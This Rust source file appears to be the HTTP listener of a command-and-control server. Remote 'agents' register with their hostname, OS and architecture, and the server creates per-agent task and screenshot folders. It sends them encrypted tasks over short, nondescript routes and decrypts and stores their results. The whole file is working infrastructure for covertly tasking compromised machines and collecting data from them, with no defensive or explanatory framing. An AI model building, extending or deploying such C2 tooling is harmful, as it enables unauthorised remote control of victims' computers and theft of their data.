use axum::{
    extract::{Request, State},
    http::StatusCode,
    Json,
    routing::{get, post},
    Router,
};
use hyper::body::Incoming;
use hyper_util::rt::TokioIo;
use log::{error, info};
use std::{
    io::{Error, ErrorKind},
    time::Duration,
    sync::Arc,
};
use tokio::{
    net::TcpListener,
    sync::{broadcast, Mutex, watch},
};
use tower::Service;
use tower_http::{
    timeout::TimeoutLayer,
    trace::TraceLayer,
};
use x25519_dalek::{PublicKey, StaticSecret};

use crate::{
    server::{
        agents::Agent,
        crypto::aesgcm::{decipher, decode, EncMessage, vec_u8_to_u8_32},
        db,
        jobs::JobMessage, 
        postdata::{CipherData, PlainData, RegisterAgentData},
    },
    utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
};

#[allow(dead_code)]
pub async fn start_http_listener(
    job_id: u32,
    host: String,
    port: u16,
    receiver: Arc<Mutex<broadcast::Receiver<JobMessage>>>,
    db_path: String,
) {
    let app = Router::new()
        .route("/", get(hello))
        .route("/r", post(register))
        .with_state(db_path.to_string())
        .route("/t/a", post(task_ask))
        .with_state(db_path.to_string())
        .route("/t/r", post(task_result))
        .with_state(db_path.to_string())
        .layer((
            TraceLayer::new_for_http(),
            TimeoutLayer::new(Duration::from_secs(10)),
        ));

    let listener = TcpListener::bind(format!("{host}:{port}"))
        .await
        .unwrap();

    info!("Start HTTP listener on {}", listener.local_addr().unwrap());

    let (close_tx, close_rx) = watch::channel(());

    loop {
        let receiver_clone_1 = Arc::clone(&receiver);
        let receiver_clone_2 = Arc::clone(&receiver);

        let (socket, remote_addr) = tokio::select! {
            result = listener.accept() => {
                result.unwrap()
            }
            _ = shutdown_signal(receiver_clone_1) => {
                info!("Signal received, not accepting new connections.");
                break;
            }
        };

        info!("Connection {remote_addr} accepted.");

        let tower_service = app.clone();

        let close_rx = close_rx.clone();

        tokio::spawn(async move {
            let receiver_clone_3 = Arc::clone(&receiver_clone_2);
            let socket = TokioIo::new(socket);

            let hyper_service = hyper::service::service_fn(move |request: Request<Incoming>| {
                tower_service.clone().call(request)
            });

            let conn = hyper::server::conn::http1::Builder::new()
                .serve_connection(socket, hyper_service)
                .with_upgrades();

            let mut conn = std::pin::pin!(conn);

            loop {
                let receiver_clone_3 = Arc::clone(&receiver_clone_3);
                tokio::select! {
                    result = conn.as_mut() => {
                        if let Err(err) = result {
                            info!("failed to serve connection: {err:#}");
                        }
                        break;
                    }

                    _ = shutdown_signal(receiver_clone_3) => {
                        info!("Signal received. Starting shutdown");
                        conn.as_mut().graceful_shutdown();
                    }
                }
            }

            info!("Connection {remote_addr} closed.");
            drop(close_rx);
        });
    }

    drop(close_rx);
    drop(listener);

    info!("Waiting for {} tasks to finish.", close_tx.receiver_count());
    close_tx.closed().await;
}

#[allow(dead_code)]
async fn hello() -> &'static str {
    info!("Agent requested `/`");
    "Hello world!"
}

#[allow(dead_code)]
async fn register(
    State(db_path): State<String>,
    Json(payload): Json<RegisterAgentData>,
) -> (StatusCode, String) {

    info!("Agent requested `/r`");

    // Get current time for `registered` and `last_commit`.
    let now_utc: chrono::DateTime<chrono::Utc> = chrono::Utc::now();
    let today_utc = now_utc.date_naive();

    let agent = Agent::new(
        0,
        payload.name,
        payload.hostname,
        payload.os,
        payload.arch,
        payload.listener_url,
        payload.public_key,
        today_utc.clone(),
        today_utc,
    );

    match db::add_agent(db_path, agent.clone()) {
        Ok(_) => {
            mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
            mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
            mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
            mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();

            return (StatusCode::OK, "".to_string());
        },
        Err(e) => {
            error!("Error adding the agent: {e}");
            return (StatusCode::OK, "".to_string());
        }
    }
}

#[allow(dead_code)]
async fn task_ask(
    State(db_path): State<String>,
    Json(payload): Json<PlainData>,
) -> (StatusCode, String) {
    info!("Agent requested `/t/a`");

    // Get the server kaypair
    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
        Ok((secret, public)) => (secret, public),
        Err(e) => {
            error!("Error: {:?}", e);
            return (StatusCode::OK, "".to_string());
        }
    };

    let agent_name = payload.p;

    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
    let encoded_ag_public_key = agent.public_key;
    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());

    if let Ok(task) = read_file(format!("agents/{}/task/name", agent_name.to_string())) {
        let cipher_message = create_cipher_message(
            String::from_utf8(task).unwrap(),
            my_secret.clone(),
            ag_public_key.clone(),
        );
        return (StatusCode::OK, cipher_message);
    } else {
        let cipher_message = create_cipher_message(
            "Task not found.".to_string(),
            my_secret.clone(),
            ag_public_key.clone(),
        );
        return (StatusCode::NOT_FOUND, cipher_message);
    }
}

#[allow(dead_code)]
async fn task_result(
    State(db_path): State<String>,
    Json(payload): Json<CipherData>,
) -> (StatusCode, String) {
    info!("Agent requested `/t/r`");

    // Get the server kaypair
    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
        Ok((secret, public)) => (secret, public),
        Err(e) => {
            error!("Error: {:?}", e);
            return (StatusCode::OK, "".to_string());
        }
    };

    let agent_name = payload.p;
    let ciphertext = payload.c;
    let nonce = payload.n;

    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
    let encoded_ag_public_key = agent.public_key;
    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());

    // Decipher the ciphertext
    let task_result = match decipher(
        EncMessage { ciphertext, nonce },
        my_secret.clone(),
        ag_public_key.clone(),
    ) {
        Ok(t) => t,
        Err(e) => {
            error!("Error decrypting the task result: {:?}", e);
            Vec::new()
        }
    };

    if let Ok(_) = write_file(
        format!(
            "agents/{}/task/result", agent_name.to_string()),
            &task_result,
    ) {
        // Initialize task
        empty_file(format!("agents/{}/task/name", agent_name.to_string())).unwrap();

        info!("Task result was written.");

        return (StatusCode::OK, "".to_string());
    } else {
        error!("The task result could not be written.");

        return (StatusCode::NOT_ACCEPTABLE, "".to_string());
    }
}

#[allow(dead_code)]
async fn shutdown_signal(receiver: Arc<Mutex<broadcast::Receiver<JobMessage>>>) {
    // let ctrl_c = async {
    //     tokio::signal::ctrl_c()
    //         .await
    //         .expect("failed to install Ctrl+c handler");
    // };

    // #[cfg(unix)]
    // let terminate = async {
    //     tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())
    //         .expect("failed to install signal handler")
    //         .recv()
    //         .await;
    // };

    // #[cfg(not(unix))]
    // let terminate = std::future::pending::<()>();

    let recv_msg = async {
        let _ = receiver.lock().await.recv().await;
    };

    tokio::select! {
        // _ = ctrl_c => {},
        // _ = terminate => {},
        _ = recv_msg => {},
    }
}

#[allow(dead_code)]
fn get_server_keypair(db_path: String) -> Result<(StaticSecret, PublicKey), Error> {
    let (encoded_my_secret, encoded_my_public) = match db::get_keypair(db_path.to_string()) {
        Ok((s, p)) => (s, p),
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, format!("Error: {}", e.to_string())));
        }
    };

    let decoded_my_secret = decode(encoded_my_secret.as_bytes());
    let decoded_my_public = decode(encoded_my_public.as_bytes());

    let my_secret = StaticSecret::from(vec_u8_to_u8_32(decoded_my_secret).unwrap());
    let my_public = PublicKey::from(vec_u8_to_u8_32(decoded_my_public).unwrap());

    Ok((my_secret, my_public))
}

#[allow(dead_code)]
fn decipher_agent_name(ciphertext: String, nonce: String, my_secret: StaticSecret, opp_public: PublicKey) -> Result<String, Error> {
    match decipher(
        EncMessage { ciphertext, nonce },
        my_secret,
        opp_public,
    ) {
        Ok(a) => {
            return Ok(String::from_utf8(a).unwrap());
        }
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        }
    };
}

#[allow(dead_code)]
fn create_cipher_message(message: String, my_secret: StaticSecret, opp_public: PublicKey) -> String {
   let cipherdata = CipherData::new(
        "".to_string(),
        message.as_bytes(),
        my_secret,
        opp_public
    );
   serde_json::to_string(&cipherdata).unwrap()
}